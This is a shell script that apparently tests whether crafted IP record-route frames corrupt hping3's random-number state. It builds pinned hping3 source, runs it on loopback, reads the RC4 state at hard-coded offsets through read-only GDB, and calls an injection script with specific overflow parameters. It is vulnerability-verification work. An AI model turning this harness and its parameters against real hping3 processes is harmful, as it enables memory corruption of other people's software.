#!/bin/sh
# Does the crafted RR write change live hp_rand() output in a real hping3?
# Loopback only: --rand-dest 127.0.0.x probes 127.0.0.0/24 on lo.  GDB is
# read-only: a breakpoint at select_next_random_dest dumps i.1, j.0 and
# random.c's rc4_sbox; it never writes process state.
# NO_INJECT=1 runs the baseline with no crafted frames.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
PINNED_SHA=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b

if [ ! -x plain-src/hping3 ]; then
    [ -d hping-src ] || cp -a ../provision/hping-src hping-src
    [ -d plain-src ] || cp -a hping-src plain-src
    mkdir -p compat/net
    : > compat/net/bpf.h
    ( cd plain-src || exit 1
      [ -f Makefile ] || ./configure --no-tcl >/dev/null 2>&1
      make clean >/dev/null 2>&1
      make -j4 CCOPT='-O0 -g -fcommon -Wall -Wno-unused -I../compat' \
          >../rng-build.log 2>&1 ) || { echo "plain build failed"; exit 2; }
fi
sha=$(sha256sum plain-src/display_ipopt.c | cut -d' ' -f1)
[ "$sha" = "$PINNED_SHA" ] || { echo "not pinned bytes: $sha"; exit 2; }

if [ "${NO_INJECT:-0}" = 1 ]; then tag=baseline; else tag=attack; fi
run="evidence/rng-$tag-run.out"
gd="evidence/rng-$tag-gdb.out"
cfg="evidence/rng-$tag.gdb"
pidf="evidence/rng-$tag.pid"
sudo -n rm -f "$pidf" "$run" "$gd"
: > "$run"; : > "$gd"

# --rand-dest makes send.c call hp_rand(); -D prints the chosen probe dest.
sudo -n sh -c "echo \$\$ > '$PWD/$pidf'; exec '$PWD/plain-src/hping3' -D -1 -G --rand-dest -I lo -c 16 -i 1 127.0.0.x" \
    > "$run" 2>&1 &
hp=$!
pid=0
for x in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s "$pidf" ] && break
    sleep 0.1
done
pid=$(cat "$pidf" 2>/dev/null || echo 0)
[ "$pid" -gt 0 ] || { echo "no hping pid"; kill "$hp" 2>/dev/null; exit 2; }

mapline=$(sudo -n awk '$3=="00000000" {print $1; exit}' "/proc/$pid/maps")
base="0x${mapline%%-*}"
sb=$(printf '0x%x' $((base + 0x29e00)))   # random.c rc4_sbox, old_rr+0x40
ii=$(printf '0x%x' $((base + 0x29f04)))   # random.c static i.1
jj=$(printf '0x%x' $((base + 0x29f08)))   # random.c static j.0
cat > "$cfg" <<EOF
set pagination off
set confirm off
file $PWD/plain-src/hping3
break select_next_random_dest
commands
silent
printf "STATE hit\\n"
x/wx $ii
x/wx $jj
x/256xb $sb
continue
end
attach $pid
c
EOF
echo "tag=$tag pid=$pid pie_base=$base sbox=$sb"

timeout 24 sudo -n gdb -q -batch -x "$cfg" > "$gd" 2>&1 &
gp=$!
sleep 4
if [ "${NO_INJECT:-0}" = 1 ]; then
    echo "NO_INJECT=1: baseline, no crafted frames"
else
    sudo -n python3 inject_rr_plain.py --pid "$pid" --ptr 255 --rr-len 255 \
        --count 3 --gap 0.15
fi
wait "$gp"
kill "$hp" 2>/dev/null
wait "$hp" 2>/dev/null

python3 check_rng.py "$gd" "$run" > "evidence/rng-$tag-proof.out"
cat "evidence/rng-$tag-proof.out"
grep -q 'RNG SUMMARY: .* PASS' "evidence/rng-$tag-proof.out" && exit 0 || exit 1
